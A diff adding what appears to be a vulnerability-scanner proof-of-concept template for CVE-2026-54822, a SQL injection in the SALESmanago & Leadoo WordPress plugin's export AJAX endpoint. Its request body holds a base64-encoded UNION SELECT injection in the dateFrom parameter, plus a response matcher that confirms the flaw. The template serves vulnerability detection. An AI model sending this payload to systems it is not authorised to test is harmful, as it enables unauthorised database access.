@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "Subscriber SQL Injection in SALESmanago & Leadoo <= 3.11.2 via export AJAX endpoint - the dateFrom parameter is directly interpolated into SQL query without sanitization or prepared statements, allowing authenticated subscribers to execute arbitrary SQL commands"
+id = "POC-AVE-2026-0098"
+name = "CVE-2026-54822 PoC"
+severity = "high"
+tags = [
+    "cve-2026-54822",
+    "sql-injection",
+    "wordpress",
+]
+vuln_id = [
+    "CVE-2026-54822",
+    "AVE-2026-0098",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wp-admin/admin-ajax.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "action=salesmanago_export_count_contacts&data=eyJkYXRlRnJvbSI6IicgVU5JT04gU0VMRUNUIDEsMiwzLDQsNSw2LDcsOCw5LDEwLDExICMifQ=="
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["packageSize"]
